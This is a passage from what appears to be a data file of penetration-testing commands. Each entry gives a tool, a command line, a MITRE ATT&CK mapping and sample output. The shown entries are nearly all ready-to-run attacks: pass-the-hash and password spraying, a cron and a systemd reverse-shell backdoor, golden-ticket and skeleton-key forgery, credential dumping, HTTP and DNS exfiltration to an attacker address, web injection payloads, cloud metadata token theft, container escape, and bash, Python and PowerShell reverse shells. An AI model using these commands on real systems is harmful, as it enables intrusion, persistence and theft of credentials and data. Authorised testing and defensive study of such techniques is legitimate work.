    description: "Pass-the-hash lateral movement via SMB. Uses NTLM hash instead of password for authentication. More stealthy than PsExec.",
    mitre: "T1550.002 — Use Alternate Authentication Material: Pass the Hash",
    example: "[!] Launching semi-interactive shell - Beware of what you type!\nC:\\Windows\\system32>"
  },
  {
    category: "Lateral Movement",
    tool: "crackmapexec",
    command: "crackmapexec smb 10.10.10.0/24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 --exec-method smbexec -x 'whoami /all'",
    os: "Linux",
    description: "Execute commands across subnet using pass-the-hash. Spray a single admin hash across all machines to find where it works.",
    mitre: "T1550.002 — Use Alternate Authentication Material: Pass the Hash",
    example: "SMB  10.10.10.5   445  DC01  [+] corp.local\\administrator (Pwn3d!)\nSMB  10.10.10.5   445  DC01  nt authority\\system\nSMB  10.10.10.10  445  WS01  [+] corp.local\\administrator (Pwn3d!)"
  },
  {
    category: "Lateral Movement",
    tool: "xfreerdp",
    command: "xfreerdp /v:10.10.10.5 /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4 /cert:ignore /dynamic-resolution",
    os: "Linux",
    description: "RDP with pass-the-hash (requires Restricted Admin mode on target). Provides full graphical desktop session.",
    mitre: "T1550.002 — Use Alternate Authentication Material: Pass the Hash",
    example: "[INFO] Connected to 10.10.10.5\n[INFO] Starting RDP session\n[INFO] Desktop resolution: 1920x1080"
  },
  {
    category: "Lateral Movement",
    tool: "ssh",
    command: "ssh -o ProxyCommand='ssh -W %h:%p pivot_user@10.10.10.5' internal_user@172.16.0.10",
    os: "Linux/macOS",
    description: "SSH pivoting — tunnel through compromised host to reach internal network. ProxyCommand chains SSH connections through jump host.",
    mitre: "T1090 — Proxy",
    example: "internal_user@internal-host:~$"
  },
  {
    category: "Lateral Movement",
    tool: "chisel",
    command: "# Server (attacker): chisel server --reverse --port 8080\n# Client (victim): chisel client 10.10.14.2:8080 R:socks",
    os: "Linux/Windows",
    description: "Create reverse SOCKS5 proxy through compromised host. All traffic through attacker's port 1080 is tunneled through the victim network.",
    mitre: "T1090.001 — Proxy: Internal Proxy",
    example: "server: session#1: tun0 (reverse SOCKS5)\nclient: Connected (Latency 45ms)"
  },
  {
    category: "Lateral Movement",
    tool: "ligolo-ng",
    command: "# Proxy (attacker): ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n# Agent (victim): ligolo-agent -connect 10.10.14.2:11601 -ignore-cert",
    os: "Linux/Windows",
    description: "Create TUN interface tunnel — entire internal network accessible as if directly connected. No SOCKS proxy needed, works with all tools natively.",
    mitre: "T1090 — Proxy",
    example: "INFO[0102] Agent joined. name=victim remote=10.10.10.5:54321\n>> session\n>> start\n[Agent: victim] Starting tunnel to 10.10.10.0/24"
  },
  {
    category: "Lateral Movement",
    tool: "rubeus",
    command: "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt /format:hashcat",
    os: "Windows",
    description: "Kerberoasting — request TGS tickets for all SPNs and export in hashcat format for offline cracking. Targets service accounts with weak passwords.",
    mitre: "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
    example: "[*] Total kerberoastable users: 5\n[*] SPN: MSSQLSvc/sql01.corp.local:1433 (sqlservice)\n[*] Hash: $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/sql01..."
  },
  {
    category: "Lateral Movement",
    tool: "rubeus",
    command: "Rubeus.exe asreproast /outfile:asrep_hashes.txt /format:hashcat",
    os: "Windows",
    description: "AS-REP roasting — find accounts with Kerberos pre-auth disabled and request encrypted AS-REP for offline cracking.",
    mitre: "T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting",
    example: "[*] Found 2 users without pre-authentication:\n    svc_backup@corp.local\n    old_admin@corp.local\n[*] Hash: $krb5asrep$23$svc_backup@CORP.LOCAL:abc123..."
  },
  {
    category: "Lateral Movement",
    tool: "impacket",
    command: "python3 impacket-secretsdump corp.local/administrator:'Password123'@10.10.10.5 -just-dc-ntlm",
    os: "Linux",
    description: "DCSync — dump all domain user NTLM hashes from Domain Controller. Extracts every user's password hash for offline cracking or pass-the-hash.",
    mitre: "T1003.006 — OS Credential Dumping: DCSync",
    example: "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a577fcf16cfef780a2ceb343ec39a0d9:::"
  },

  // ============================================================
  // PERSISTENCE
  // ============================================================
  {
    category: "Persistence",
    tool: "crontab",
    command: "(crontab -l; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"') | crontab -",
    os: "Linux",
    description: "Add cron job reverse shell — executes every minute, providing persistent callback to attacker. Survives reboots and user logouts.",
    mitre: "T1053.003 — Scheduled Task/Job: Cron",
    example: "no crontab for www-data\ncrontab: installing new crontab"
  },
  {
    category: "Persistence",
    tool: "ssh-keygen",
    command: "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA... attacker@kali' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
    os: "Linux",
    description: "Add SSH public key to authorized_keys for passwordless persistent access. More stealthy than password-based backdoor.",
    mitre: "T1098.004 — Account Manipulation: SSH Authorized Keys",
    example: "(no output — key added silently)"
  },
  {
    category: "Persistence",
    tool: "systemctl",
    command: "cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=System Update Service\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable backdoor.service && systemctl start backdoor.service",
    os: "Linux",
    description: "Create systemd service for persistent reverse shell. Automatically restarts on failure and survives reboots. Disguised as 'System Update Service'.",
    mitre: "T1543.002 — Create or Modify System Process: Systemd Service",
    example: "Created symlink /etc/systemd/system/multi-user.target.wants/backdoor.service"
  },
  {
    category: "Persistence",
    tool: "reg",
    command: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\" /f",
    os: "Windows",
    description: "Add registry Run key for persistence — payload executes at every user login. Common persistence mechanism for malware.",
    mitre: "T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys",
    example: "The operation completed successfully."
  },
  {
    category: "Persistence",
    tool: "schtasks",
    command: "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\Public\\payload.exe\" /sc onlogon /ru SYSTEM /f",
    os: "Windows",
    description: "Create scheduled task running as SYSTEM at every logon. More powerful than Run key — runs with highest privileges.",
    mitre: "T1053.005 — Scheduled Task/Job: Scheduled Task",
    example: "SUCCESS: The scheduled task \"WindowsUpdate\" has successfully been created."
  },
  {
    category: "Persistence",
    tool: "mimikatz",
    command: "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
    os: "Windows",
    description: "Skeleton Key attack — patches LSASS on Domain Controller to accept a master password ('mimikatz') for any domain account. Does not survive DC reboot.",
    mitre: "T1556.001 — Modify Authentication Process: Domain Controller Authentication",
    example: "[*] Patch OK for 'mimilib' in LSASS\n[*] Skeleton Key injected"
  },
  {
    category: "Persistence",
    tool: "mimikatz",
    command: "mimikatz.exe \"kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:a577fcf16cfef780a2ceb343ec39a0d9 /ptt\" \"exit\"",
    os: "Windows",
    description: "Golden Ticket — forge TGT using krbtgt hash for persistent domain-wide access. Ticket valid for 10 years by default. Survives password resets (except double krbtgt rotation).",
    mitre: "T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket",
    example: "User      : fakeadmin\nDomain    : corp.local\nTicket    : ** Pass The Ticket **\n[*] Golden ticket for 'fakeadmin@corp.local' successfully submitted for current session"
  },

  // ============================================================
  // POST-EXPLOITATION
  // ============================================================
  {
    category: "Post-Exploitation",
    tool: "meterpreter",
    command: "meterpreter > hashdump\nmeterpreter > getsystem\nmeterpreter > load kiwi\nmeterpreter > creds_all",
    os: "Windows",
    description: "Meterpreter post-exploitation — dump hashes, escalate to SYSTEM, load Mimikatz (kiwi extension), extract all credentials from memory.",
    mitre: "T1003.001 — OS Credential Dumping: LSASS Memory",
    example: "Administrator:500:aad3b435b51404ee:32ed87bdb5fdc...\nCredentials:\n  Username: administrator\n  Domain: CORP\n  Password: Password123"
  },
  {
    category: "Post-Exploitation",
    tool: "meterpreter",
    command: "meterpreter > run post/multi/gather/firefox_creds\nmeterpreter > run post/multi/gather/ssh_creds\nmeterpreter > run post/windows/gather/enum_chrome",
    os: "Windows/Linux",
    description: "Post-exploitation credential gathering from browsers and SSH. Extracts saved passwords, cookies, SSH keys from compromised system.",
    mitre: "T1555.003 — Credentials from Password Stores: Credentials from Web Browsers",
    example: "[+] Firefox credentials file found\n[+] Decrypted password: admin / SuperSecret123 for https://internal.corp.local\n[+] SSH private key found: /home/user/.ssh/id_rsa"
  },
  {
    category: "Post-Exploitation",
    tool: "grep",
    command: "grep -rn --include='*.{conf,cfg,ini,xml,json,yaml,yml,env,properties,txt,php,py,js,config}' -iE '(password|passwd|pwd|secret|api.?key|token|credential|connection.?string)\\s*[=:]\\s*[^\\s]' / 2>/dev/null",
    os: "Linux",
    description: "Search entire filesystem for hardcoded credentials in configuration files. Look for passwords, API keys, tokens, connection strings.",
    mitre: "T1552.001 — Unsecured Credentials: Credentials In Files",
    example: "/etc/mysql/my.cnf:password = MySqlPass123\n/var/www/html/config.php:$db_password = 'WebAppP@ss';\n/opt/app/.env:AWS_SECRET_ACCESS_KEY=AKIA..."
  },
  {
    category: "Post-Exploitation",
    tool: "cmdkey",
    command: "cmdkey /list\nrunas /savecred /user:CORP\\administrator cmd.exe",
    os: "Windows",
    description: "List and exploit saved Windows credentials. If a user has saved admin credentials, runas /savecred launches processes without re-entering password.",
    mitre: "T1555.004 — Credentials from Password Stores: Windows Credential Manager",
    example: "Currently stored credentials:\n  Target: Domain:interactive=CORP\\administrator\n  Type: Domain Password\n  User: CORP\\administrator"
  },
  {
    category: "Post-Exploitation",
    tool: "reg",
    command: "reg save HKLM\\SYSTEM system.hiv && reg save HKLM\\SAM sam.hiv && reg save HKLM\\SECURITY security.hiv",
    os: "Windows",
    description: "Save registry hives for offline credential extraction. Use impacket-secretsdump locally to extract LSA secrets, cached domain logons, and local SAM hashes.",
    mitre: "T1003.002 — OS Credential Dumping: Security Account Manager",
    example: "The operation completed successfully.\nThe operation completed successfully.\nThe operation completed successfully."
  },
  {
    category: "Post-Exploitation",
    tool: "impacket",
    command: "python3 impacket-secretsdump -sam sam.hiv -security security.hiv -system system.hiv LOCAL",
    os: "Linux",
    description: "Extract credentials from saved registry hives offline. Dumps local SAM hashes, cached domain credentials, and LSA secrets.",
    mitre: "T1003.002 — OS Credential Dumping: Security Account Manager",
    example: "[*] Target system bootKey: 0x1234567890abcdef\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404ee:32ed87bdb5fdc...\n[*] Dumping cached domain logon information (domain/username:hash)"
  },

  // ============================================================
  // EXFILTRATION
  // ============================================================
  {
    category: "Exfiltration",
    tool: "tar",
    command: "tar czf - /path/to/sensitive/data | openssl enc -aes-256-cbc -pbkdf2 -pass pass:ExfilKey123 | base64 | curl -X POST -d @- http://10.10.14.2:8080/upload",
    os: "Linux",
    description: "Compress, encrypt, encode, and exfiltrate data via HTTP POST. AES-256-CBC encryption with PBKDF2 key derivation prevents content inspection.",
    mitre: "T1048.003 — Exfiltration Over Alternative Protocol: Unencrypted Non-C2",
    example: "(data sent to attacker's listener)"
  },
  {
    category: "Exfiltration",
    tool: "dnscat2",
    command: "# Server: ruby dnscat2.rb tunnel.attacker.com\n# Client: ./dnscat --dns=server=10.10.14.2,port=53 --secret=SharedSecret123",
    os: "Linux",
    description: "DNS tunneling for exfiltration — encodes data in DNS queries/responses to bypass firewalls. Even air-gapped networks often allow DNS.",
    mitre: "T1048.001 — Exfiltration Over Alternative Protocol: Encrypted Non-C2 via DNS",
    example: "New session established: session-1\ncommand (session-1) > download /etc/shadow\nDownloading /etc/shadow...\nDownload complete."
  },
  {
    category: "Exfiltration",
    tool: "scp",
    command: "scp -r /path/to/data user@10.10.14.2:/loot/ 2>/dev/null",
    os: "Linux",
    description: "Secure copy files to attacker machine via SSH. Fast, encrypted, and blends with normal SSH traffic.",
    mitre: "T1048.002 — Exfiltration Over Alternative Protocol: Encrypted Non-C2",
    example: "shadow     100%  1234     0.0KB/s   00:00\npasswd     100%  2345     0.0KB/s   00:00"
  },
  {
    category: "Exfiltration",
    tool: "certutil",
    command: "certutil -urlcache -split -f http://10.10.14.2/payload.exe C:\\Users\\Public\\payload.exe",
    os: "Windows",
    description: "Download files using Windows built-in certutil. Often used because certutil is signed by Microsoft and whitelisted by AppLocker. Also used for base64 encoding for exfil.",
    mitre: "T1105 — Ingress Tool Transfer",
    example: "****  Online  ****\nCertUtil: -URLCache command completed successfully."
  },
  {
    category: "Exfiltration",
    tool: "powershell",
    command: "powershell -ep bypass -c \"$data = Get-Content C:\\sensitive.txt; $bytes = [System.Text.Encoding]::UTF8.GetBytes($data); Invoke-WebRequest -Uri http://10.10.14.2:8080/ -Method POST -Body $bytes\"",
    os: "Windows",
    description: "PowerShell-based data exfiltration via HTTP POST. Read sensitive file and send to attacker's listener.",
    mitre: "T1048.003 — Exfiltration Over Alternative Protocol: Unencrypted Non-C2",
    example: "StatusCode: 200\nContent: OK"
  },

  // ============================================================
  // WIRELESS ATTACKS
  // ============================================================
  {
    category: "Wireless",
    tool: "aircrack-ng",
    command: "airmon-ng start wlan0 && airodump-ng wlan0mon",
    os: "Linux",
    description: "Enable monitor mode and scan for wireless networks. Shows SSIDs, BSSIDs, channels, encryption types, connected clients.",
    mitre: "T1040 — Network Sniffing",
    example: "BSSID              PWR  CH  ENC   ESSID\nAA:BB:CC:DD:EE:FF  -45  6   WPA2  CorpWiFi\n11:22:33:44:55:66  -62  11  WPA2  GuestNetwork"
  },
  {
    category: "Wireless",
    tool: "aircrack-ng",
    command: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon && aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon && aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
    os: "Linux",
    description: "WPA2 handshake capture and cracking: 1) Target specific AP and capture, 2) Deauth clients to force handshake, 3) Crack with wordlist.",
    mitre: "T1557 — Adversary-in-the-Middle",
    example: "WPA (1 handshake)\nKEY FOUND! [ password123 ]\nMaster Key    : AB CD EF 01 23 45..."
  },
  {
    category: "Wireless",
    tool: "bettercap",
    command: "bettercap -iface wlan0mon -eval 'wifi.recon on; wifi.show; wifi.deauth AA:BB:CC:DD:EE:FF'",
    os: "Linux",
    description: "WiFi reconnaissance and deauthentication with bettercap. Modern alternative to aircrack-ng suite with scripting support.",
    mitre: "T1557 — Adversary-in-the-Middle",
    example: "wifi.recon started\n┌─────────────────────────────────────────┐\n│ BSSID             │ SSID      │ Channel │\n│ AA:BB:CC:DD:EE:FF │ CorpWiFi  │ 6       │"
  },
  {
    category: "Wireless",
    tool: "hostapd-mana",
    command: "hostapd-mana /etc/hostapd-mana/mana.conf",
    os: "Linux",
    description: "Evil twin access point with credential capture. Creates rogue AP mimicking target network to capture WPA Enterprise credentials or perform MITM.",
    mitre: "T1557 — Adversary-in-the-Middle",
    example: "wlan0: AP-ENABLED\nwlan0: STA aa:bb:cc:dd:ee:ff IEEE 802.11: associated\nEAP-MSCHAPV2: CORP\\jdoe:challenge:response"
  },

  // ============================================================
  // ACTIVE DIRECTORY ATTACKS
  // ============================================================
  {
    category: "Active Directory",
    tool: "impacket",
    command: "python3 impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.5 -usersfile users.txt -no-pass -outputfile asrep_hashes.txt",
    os: "Linux",
    description: "AS-REP roasting from Linux — find accounts with Kerberos pre-auth disabled and request encrypted AS-REP for offline cracking.",
    mitre: "T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting",
    example: "$krb5asrep$23$svc_backup@CORP.LOCAL:abc123def456...\n$krb5asrep$23$old_admin@CORP.LOCAL:789abc012def..."
  },
  {
    category: "Active Directory",
    tool: "impacket",
    command: "python3 impacket-GetUserSPNs corp.local/jdoe:'Password123' -dc-ip 10.10.10.5 -outputfile kerberoast_hashes.txt",
    os: "Linux",
    description: "Kerberoasting from Linux — request TGS tickets for all SPNs and save for offline password cracking with hashcat -m 13100.",
    mitre: "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
    example: "ServicePrincipalName         Name          MemberOf\nMSSQLSvc/sql01:1433          sqlservice    Domain Admins\nHTTP/web01.corp.local        webservice    \n$krb5tgs$23$*sqlservice$CORP.LOCAL..."
  },
  {
    category: "Active Directory",
    tool: "certipy",
    command: "certipy req -u 'jdoe@corp.local' -p 'Password123' -ca 'CORP-CA' -target 10.10.10.5 -template 'UserTemplate' -upn 'administrator@corp.local'",
    os: "Linux",
    description: "ESC1 ADCS attack — request certificate as administrator using vulnerable template that allows SAN specification. Then authenticate as admin.",
    mitre: "T1649 — Steal or Forge Authentication Certificates",
    example: "[*] Requesting certificate for administrator@corp.local\n[*] Got certificate with UPN 'administrator@corp.local'\n[*] Certificate saved to administrator.pfx"
  },
  {
    category: "Active Directory",
    tool: "petitpotam",
    command: "python3 PetitPotam.py 10.10.14.2 10.10.10.5",
    os: "Linux",
    description: "Coerce Windows authentication from DC via EFS RPC (MS-EFSRPC). Used with ntlmrelayx to relay DC authentication to ADCS for domain compromise.",
    mitre: "T1187 — Forced Authentication",
    example: "Attacking 10.10.10.5\nTrying pipe efsr\n[-] Connecting to ncacn_np:10.10.10.5[\\pipe\\efsrpc]\n[+] Got handle\n[+] File encrypted successfully"
  },
  {
    category: "Active Directory",
    tool: "crackmapexec",
    command: "crackmapexec smb 10.10.10.0/24 -u jdoe -p 'Winter2024!' --continue-on-success",
    os: "Linux",
    description: "Password spraying across AD domain. Test one password against all hosts. --continue-on-success doesn't stop after first valid cred.",
    mitre: "T1110.003 — Brute Force: Password Spraying",
    example: "SMB  10.10.10.5   445  DC01  [-] corp.local\\jdoe:Winter2024! STATUS_LOGON_FAILURE\nSMB  10.10.10.10  445  WS01  [+] corp.local\\jdoe:Winter2024! (Pwn3d!)"
  },
  {
    category: "Active Directory",
    tool: "powerview",
    command: "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Find-DomainShare -CheckShareAccess | Out-File shares.txt; Get-DomainUser -AdminCount | select samaccountname,memberof\"",
    os: "Windows",
    description: "PowerView AD enumeration — find accessible shares and list admin users. Essential for mapping AD trust relationships and attack paths.",
    mitre: "T1087.002 — Account Discovery: Domain Account",
    example: "Name    : \\\\DC01\\NETLOGON\nName    : \\\\FS01\\SharedDocs\nsamaccountname   memberof\nadministrator    {Domain Admins, Enterprise Admins}"
  },
  {
    category: "Active Directory",
    tool: "sharphound",
    command: "SharpHound.exe -c All,GPOLocalGroup --encryptzip --nosavecache --randomfilenames --outputdirectory C:\\Users\\Public\\",
    os: "Windows",
    description: "BloodHound data collection from Windows. -c All collects users, groups, sessions, ACLs, trusts, containers. Import zip into BloodHound GUI to visualize attack paths.",
    mitre: "T1087.002 — Account Discovery: Domain Account",
    example: "Initializing SharpHound\nResolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, GPOLocalGroup\nStatus: 2543 name lookups, 854 group memberships\nSharpHound Enumeration Completed"
  },

  // ============================================================
  // WEB APPLICATION ATTACKS
  // ============================================================
  {
    category: "Web Application",
    tool: "burpsuite",
    command: "# Burp Suite Intruder payloads for IDOR testing:\n# Position: GET /api/users/§1§/profile\n# Payload: Numbers 1-1000\n# Match: HTTP 200 with response body containing user data",
    os: "Linux/macOS/Windows",
    description: "IDOR (Insecure Direct Object Reference) testing with Burp Suite Intruder. Enumerate user IDs to access other users' data by changing sequential identifiers.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "Request: GET /api/users/42/profile HTTP/1.1\nResponse: {\"username\":\"admin\",\"email\":\"admin@corp.com\",\"role\":\"administrator\"}"
  },
  {
    category: "Web Application",
    tool: "curl",
    command: "curl -X POST http://10.10.10.5/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}' -v",
    os: "Linux/macOS",
    description: "NoSQL injection (MongoDB) — bypass authentication using $ne (not equal) operator. If password is not empty string, condition is always true.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "HTTP/1.1 200 OK\n{\"token\":\"eyJhbGciOiJIUzI1NiIs...\",\"user\":\"admin\"}"
  },
  {
    category: "Web Application",
    tool: "curl",
    command: "curl http://10.10.10.5/api/exec -X POST -d 'cmd=;cat /etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'",
    os: "Linux/macOS",
    description: "OS command injection via web application. Semicolon breaks out of intended command, executes arbitrary system commands.",
    mitre: "T1059 — Command and Scripting Interpreter",
    example: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
  },
  {
    category: "Web Application",
    tool: "curl",
    command: "curl http://10.10.10.5/page?file=....//....//....//etc/passwd",
    os: "Linux/macOS",
    description: "Path traversal / Local File Inclusion (LFI). Double-encoding and filter bypass to read arbitrary files from the server filesystem.",
    mitre: "T1083 — File and Directory Discovery",
    example: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
  },
  {
    category: "Web Application",
    tool: "curl",
    command: "curl -X POST 'http://10.10.10.5/api/data' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'",
    os: "Linux/macOS",
    description: "XXE (XML External Entity) injection. Define external entity referencing local file, which gets included in the XML response.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "<data>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin</data>"
  },
  {
    category: "Web Application",
    tool: "curl",
    command: "curl http://10.10.10.5/profile -H 'Content-Type: application/x-www-form-urlencoded' -d 'name={{7*7}}'",
    os: "Linux/macOS",
    description: "SSTI (Server-Side Template Injection) detection. If response contains '49' instead of '{{7*7}}', the template engine is executing code.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "<h1>Welcome, 49</h1>"
  },
  {
    category: "Web Application",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py eyJhbGciOiJIUzI1NiIs... -T -S hs256 -p 'secret' -I -pc role -pv admin",
    os: "Linux",
    description: "JWT manipulation — tamper with token claims (change role to admin), test for weak signing secrets, algorithm confusion (RS256→HS256) attacks.",
    mitre: "T1550 — Use Alternate Authentication Material",
    example: "[+] Token header:\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}\n[+] Token payload:\n{\"user\":\"jdoe\",\"role\":\"admin\"}\n[+] Tampered token: eyJhbGci..."
  },

  // ============================================================
  // NETWORK ATTACKS
  // ============================================================
  {
    category: "Network",
    tool: "bettercap",
    command: "bettercap -iface eth0 -eval 'net.probe on; net.sniff on; arp.spoof on; set arp.spoof.targets 10.10.10.50; set arp.spoof.fullduplex true'",
    os: "Linux",
    description: "ARP spoofing MITM attack. Poison ARP cache of target and gateway to intercept all traffic. Full duplex spoofs both sides for complete interception.",
    mitre: "T1557.002 — ARP Cache Poisoning",
    example: "[net.recon] endpoint 10.10.10.50 detected as AA:BB:CC:DD:EE:FF\n[arp.spoof] spoofing 10.10.10.50 -> 10.10.10.1\n[net.sniff] 10.10.10.50 > GET /login HTTP/1.1"
  },
  {
    category: "Network",
    tool: "tcpdump",
    command: "tcpdump -i eth0 -w capture.pcap 'port 80 or port 443 or port 21 or port 23 or port 25'",
    os: "Linux/macOS",
    description: "Capture network traffic on common service ports for analysis. Save to pcap for later analysis in Wireshark.",
    mitre: "T1040 — Network Sniffing",
    example: "tcpdump: listening on eth0, link-type EN10MB\n14:23:45.123456 IP 10.10.10.50.54321 > 10.10.10.5.80: Flags [S], seq 12345"
  },
  {
    category: "Network",
    tool: "wireshark/tshark",
    command: "tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value",
    os: "Linux/macOS",
    description: "Extract HTTP POST data from pcap — capture form submissions, login credentials, and API requests from sniffed traffic.",
    mitre: "T1040 — Network Sniffing",
    example: "10.10.10.50\texample.com\t/login\tadmin\tpassword123"
  },
  {
    category: "Network",
    tool: "mitmproxy",
    command: "mitmproxy --mode transparent --showhost -w traffic.flow",
    os: "Linux",
    description: "Transparent HTTPS proxy for intercepting and modifying web traffic. Can inject scripts, modify responses, strip SSL, and record all traffic.",
    mitre: "T1557 — Adversary-in-the-Middle",
    example: "Flow: GET https://example.com/api/user\nRequest headers, response body fully visible and modifiable"
  },

  // ============================================================
  // CONTAINER & CLOUD ATTACKS
  // ============================================================
  {
    category: "Cloud & Container",
    tool: "curl",
    command: "curl -s http://169.254.169.254/latest/meta-data/ && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    os: "Linux",
    description: "AWS IMDS (Instance Metadata Service) credential theft. Access from SSRF or compromised EC2 instance to retrieve IAM role credentials.",
    mitre: "T1552.005 — Unsecured Credentials: Cloud Instance Metadata API",
    example: "ami-id\nhostname\niam/\nlocal-ipv4\nsecurity-credentials/\n  EC2-Instance-Role"
  },
  {
    category: "Cloud & Container",
    tool: "curl",
    command: "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    os: "Linux",
    description: "GCP metadata endpoint for service account token theft. Requires Metadata-Flavor header (but some SSRF can add custom headers).",
    mitre: "T1552.005 — Unsecured Credentials: Cloud Instance Metadata API",
    example: "{\"access_token\":\"ya29.c.Ko8B...\",\"expires_in\":3600,\"token_type\":\"Bearer\"}"
  },
  {
    category: "Cloud & Container",
    tool: "kubectl",
    command: "kubectl auth can-i --list && kubectl get secrets -A -o json",
    os: "Linux/macOS",
    description: "Kubernetes privilege check and secret extraction. List all permissions, then dump all secrets across all namespaces.",
    mitre: "T1552.007 — Unsecured Credentials: Container API",
    example: "Resources  Verbs\n*.*        [*]\nSecrets:\n  default/db-credentials: {\"DB_PASSWORD\":\"s3cret\"}\n  kube-system/admin-token: {\"token\":\"eyJhbG...\"}"
  },
  {
    category: "Cloud & Container",
    tool: "docker",
    command: "docker run -v /:/host --privileged -it alpine chroot /host /bin/bash",
    os: "Linux",
    description: "Docker container escape via privileged mode. Mount host filesystem and chroot into it for full host access. Works when user has docker socket access.",
    mitre: "T1611 — Escape to Host",
    example: "root@container:/# cat /host/etc/shadow\nroot:$6$abc123..."
  },
  {
    category: "Cloud & Container",
    tool: "aws",
    command: "aws sts get-caller-identity && aws s3 ls && aws iam list-users && aws ec2 describe-instances --region us-east-1",
    os: "Linux/macOS",
    description: "AWS enumeration with stolen credentials. Identify current principal, list S3 buckets, IAM users, and EC2 instances.",
    mitre: "T1580 — Cloud Infrastructure Discovery",
    example: "Account: 123456789012\nArn: arn:aws:iam::123456789012:user/dev-user\nBuckets:\n  company-backups\n  prod-data-lake\n  staging-configs"
  },
  {
    category: "Cloud & Container",
    tool: "pacu",
    command: "pacu --new-session pentest && exec iam__enum_permissions && exec s3__download_bucket --bucket company-backups",
    os: "Linux",
    description: "AWS exploitation framework (like Metasploit for AWS). Enumerate IAM permissions, exploit misconfigurations, escalate privileges, and exfiltrate data.",
    mitre: "T1580 — Cloud Infrastructure Discovery",
    example: "Module: iam__enum_permissions\nPermissions for user dev-user:\n  s3:GetObject, s3:ListBucket, iam:PassRole, lambda:CreateFunction"
  },

  // ============================================================
  // REVERSE SHELLS
  // ============================================================
  {
    category: "Reverse Shell",
    tool: "bash",
    command: "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1",
    os: "Linux",
    description: "Bash TCP reverse shell — the most common Linux reverse shell. Redirects stdin/stdout/stderr over TCP to attacker's listener.",
    mitre: "T1059.004 — Command and Scripting Interpreter: Unix Shell",
    example: "attacker$ nc -lvnp 4444\nConnection received on 10.10.10.5\nwww-data@victim:~$"
  },
  {
    category: "Reverse Shell",
    tool: "python",
    command: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.2\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    os: "Linux/macOS",
    description: "Python reverse shell. Useful when bash redirect is blocked. Python is commonly available on Linux systems.",
    mitre: "T1059.006 — Command and Scripting Interpreter: Python",
    example: "attacker$ nc -lvnp 4444\nConnection received on 10.10.10.5\nwww-data@victim:~$"
  },
  {
    category: "Reverse Shell",
    tool: "powershell",
    command: "powershell -nop -ep bypass -c \"$c=New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"",
    os: "Windows",
    description: "PowerShell reverse shell — the most common Windows reverse shell. Bypasses execution policy with -ep bypass and runs non-interactively with -nop.",
    mitre: "T1059.001 — Command and Scripting Interpreter: PowerShell",
